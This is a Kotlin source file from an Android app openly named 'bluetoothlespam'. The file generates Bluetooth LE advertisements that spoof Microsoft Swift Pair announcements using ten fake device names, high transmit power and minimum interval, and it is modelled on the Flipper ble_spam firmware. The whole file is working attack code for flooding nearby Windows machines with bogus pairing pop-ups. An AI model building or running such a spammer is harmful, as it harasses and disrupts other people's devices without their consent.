package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData

class SwiftPairAdvertisementSetGenerator : IAdvertisementSetGenerator {

    // Generating Manufacturer Specific Data like found here:
    // https://github.com/Flipper-XFW/Xtreme-Firmware/blob/dev/applications/external/ble_spam/protocols/swiftpair.c

    private val _prependedBytes = StringHelpers.decodeHex("030080")
    private var _deviceNames = mutableListOf(
        "Device 1",
        "Device 2",
        "Device 3",
        "Device 4",
        "Device 5",
        "Device 6",
        "Device 7",
        "Device 8",
        "Device 9",
        "Device 10")

    private val _manufacturerId = 6 // 0x0006 == 6 = Microsoft
    override fun getAdvertisementSets(): List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        _deviceNames.map {deviceName ->

            var advertisementSet:AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_WINDOWS
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_SWIFT_PAIRING

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            manufacturerSpecificData.manufacturerSpecificData = _prependedBytes.plus(deviceName.toByteArray())
            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            // advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.title = deviceName

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}